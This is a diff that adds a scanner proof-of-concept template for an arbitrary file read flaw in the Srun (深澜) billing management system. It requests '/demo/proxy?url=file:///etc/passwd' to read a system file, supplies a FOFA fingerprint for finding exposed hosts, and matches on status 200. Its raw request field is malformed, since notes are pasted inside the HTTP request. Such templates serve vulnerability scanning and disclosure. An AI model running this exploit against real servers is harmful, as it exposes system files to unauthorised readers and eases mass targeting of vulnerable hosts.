@@ -1,0 +1,34 @@
+id: poc-gm29xlwbuum6qduc
+info:
+  name: 深澜计费管理系统 proxy 任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gm29xlwbuum6qduc'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gm29xlwbuum6qduc
+    fofa: body="/js/lib/slimscroll.js"
+http:
+- raw:
+  - 'GET /demo/proxy?url=file:///etc/passwd HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?root)(?=.*?bin).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
